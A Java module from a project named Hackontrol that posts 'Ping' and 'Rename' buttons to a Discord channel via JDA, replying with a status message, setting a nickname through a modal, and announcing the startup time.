package com.khopan.hackontrol.module;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;

public class HackontrolModule extends Module {
	private static String MODULE_NAME = "hackontrol";

	private static final Button BUTTON_PING   = ButtonManager.staticButton(ButtonType.SUCCESS, "Ping",   "ping");
	private static final Button BUTTON_RENAME = ButtonManager.staticButton(ButtonType.SUCCESS, "Rename", "rename");

	private static final String MODAL_RENAME = "rename";

	@Override
	public String getName() {
		return HackontrolModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, HackontrolModule.BUTTON_PING,   context -> HackontrolMessage.deletable(context.reply(), "**Status: Ok**"));
		registry.register(InteractionManager.BUTTON_REGISTRY, HackontrolModule.BUTTON_RENAME, this :: buttonRename);
		registry.register(InteractionManager.MODAL_REGISTRY,  HackontrolModule.MODAL_RENAME,  this :: modalRename);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(HackontrolModule.BUTTON_PING, HackontrolModule.BUTTON_RENAME)).queue();
	}

	@Override
	public void postInitialize() {
		long time = Hackontrol.STARTUP_TIME / 1000L;
		this.channel.sendMessage("**Online: <t:" + time + ":f> (<t:" + time + ":R>)**").queue();
	}

	private void buttonRename(ButtonContext context) {
		Hackontrol hackontrol = Hackontrol.getInstance();
		TextInput textInput = TextInput.create("nickname", "Nickname", TextInputStyle.SHORT)
				.setRequired(true)
				.setPlaceholder("Enter a name...")
				.setValue(hackontrol.getNickname())
				.build();

		Modal modal = Modal.create(HackontrolModule.MODAL_RENAME, "Rename")
				.addActionRow(textInput)
				.build();

		context.replyModal(modal).queue();
	}

	private void modalRename(ModalContext context) {
		Hackontrol.getInstance().setNickname(context.getValue("nickname").getAsString());
		context.deferEdit().queue();
	}
}
